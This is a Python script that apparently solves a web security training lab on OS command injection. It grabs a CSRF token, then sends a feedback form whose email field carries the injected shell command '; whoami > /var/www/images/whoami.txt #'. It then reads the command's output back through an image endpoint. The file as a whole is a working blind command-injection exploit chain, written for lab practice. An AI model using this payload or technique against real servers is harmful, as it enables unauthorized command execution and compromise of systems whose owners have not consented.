from ..utils import *
from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/feedback")
    print_info(f'Grabbing CSRF value from "{url}"')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")
    else:
        print_success(f"CSRF value: {csrf}\n")

    payload = "; whoami > /var/www/images/whoami.txt #"
    data = {
        "csrf": csrf,
        "name": "user",
        "email": f"user@example.com{payload}",
        "subject": "Example Subject",
        "message": "This is an example message.",
    }

    url = urljoin(url, "/feedback/submit")
    print_info(
        f'Performing an OS command injection attack by sending a POST request to "{url}" with the following data:'
    )
    print(f"{data}")

    resp = s.post(url, proxies=proxies, verify=False, data=data)
    if resp.status_code != 200:
        print_fail("POST request not sent successfully.")
    else:
        print_success("POST request sent successfully.\n")

    url = urljoin(url, "/image")
    params = {"filename": "whoami.txt"}
    print_info(
        f'Visiting "{url}?{urlencode(params)}" to retrieve the output of the command...'
    )

    resp = requests.get(url, proxies=proxies, verify=False, params=params)
    if resp.status_code != 200:
        print_fail(resp.text)
    else:
        print_success(resp.text)
